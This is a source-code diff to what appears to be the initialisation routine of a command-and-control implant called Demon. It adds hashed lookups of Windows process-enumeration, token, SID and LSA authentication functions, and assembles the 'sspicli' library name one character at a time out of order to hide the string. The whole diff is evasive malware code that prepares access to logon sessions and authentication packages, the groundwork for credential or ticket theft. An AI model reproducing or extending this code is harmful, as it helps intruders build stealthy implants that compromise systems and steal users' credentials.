@@ -298,6 +298,8 @@ VOID DemonInit( VOID )
         Instance.Win32.LocalFree                           = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_LocalFree );
         Instance.Win32.CreateRemoteThread                  = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateRemoteThread );
         Instance.Win32.CreateToolhelp32Snapshot            = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateToolhelp32Snapshot );
+        Instance.Win32.Process32FirstW                     = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Process32FirstW );
+        Instance.Win32.Process32NextW                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_Process32NextW );
         Instance.Win32.CreatePipe                          = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreatePipe );
         Instance.Win32.CreateProcessA                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateProcessA );
         Instance.Win32.CreateFileW                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_CreateFileW );
@@ -630,6 +632,16 @@ VOID DemonInit( VOID )
     ModuleName[ 6 ] = 0;
     Instance.Modules.Dnsapi = LdrModuleLoad( ModuleName );
 
+    ModuleName[ 0 ] = 's';
+    ModuleName[ 7 ] = 0;
+    ModuleName[ 1 ] = 's';
+    ModuleName[ 6 ] = 'i';
+    ModuleName[ 5 ] = 'l';
+    ModuleName[ 2 ] = 'p';
+    ModuleName[ 4 ] = 'c';
+    ModuleName[ 3 ] = 'i';
+    Instance.Modules.Sspicli = LdrModuleLoad( ModuleName );
+
     MemSet( ModuleName, 0, 20 );
 
     // TODO: sort function (library)
@@ -656,9 +668,13 @@ VOID DemonInit( VOID )
         Instance.Win32.InitializeSecurityDescriptor        = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_InitializeSecurityDescriptor );
         Instance.Win32.AddMandatoryAce                     = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_AddMandatoryAce );
         Instance.Win32.InitializeAcl                       = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_InitializeAcl );
-        Instance.Win32.AllocateAndInitializeSid            = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_AllocateAndInitializeSid  );
+        Instance.Win32.AllocateAndInitializeSid            = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_AllocateAndInitializeSid );
+        Instance.Win32.CheckTokenMembership                = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_CheckTokenMembership );
         Instance.Win32.SetEntriesInAclW                    = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_SetEntriesInAclW );
         Instance.Win32.SetThreadToken                      = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_SetThreadToken );
+        Instance.Win32.LsaNtStatusToWinError               = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_LsaNtStatusToWinError );
+        Instance.Win32.EqualSid                            = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_EqualSid );
+        Instance.Win32.ConvertSidToStringSidW              = LdrFunctionAddr( Instance.Modules.Advapi32, FuncHash_ConvertSidToStringSidW );
 
         PUTS( "Loaded Advapi32 functions" )
     }
@@ -787,6 +803,18 @@ VOID DemonInit( VOID )
         Instance.Win32.DnsQuery_A = LdrFunctionAddr( Instance.Modules.Dnsapi, 0xeb04a380 );
 
         PUTS( "Loaded DnsApi functions" )
+    }
+
+    if ( Instance.Modules.Sspicli )
+    {
+        Instance.Win32.LsaRegisterLogonProcess        = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaRegisterLogonProcess );
+        Instance.Win32.LsaLookupAuthenticationPackage = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaLookupAuthenticationPackage );
+        Instance.Win32.LsaDeregisterLogonProcess      = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaDeregisterLogonProcess );
+        Instance.Win32.LsaConnectUntrusted            = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaConnectUntrusted );
+        Instance.Win32.LsaFreeReturnBuffer            = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaFreeReturnBuffer );
+        Instance.Win32.LsaCallAuthenticationPackage   = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaCallAuthenticationPackage );
+        Instance.Win32.LsaGetLogonSessionData         = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaGetLogonSessionData );
+        Instance.Win32.LsaEnumerateLogonSessions      = LdrFunctionAddr( Instance.Modules.Sspicli, FuncHash_LsaEnumerateLogonSessions );
     }
 
     PUTS( "Set basic info" )
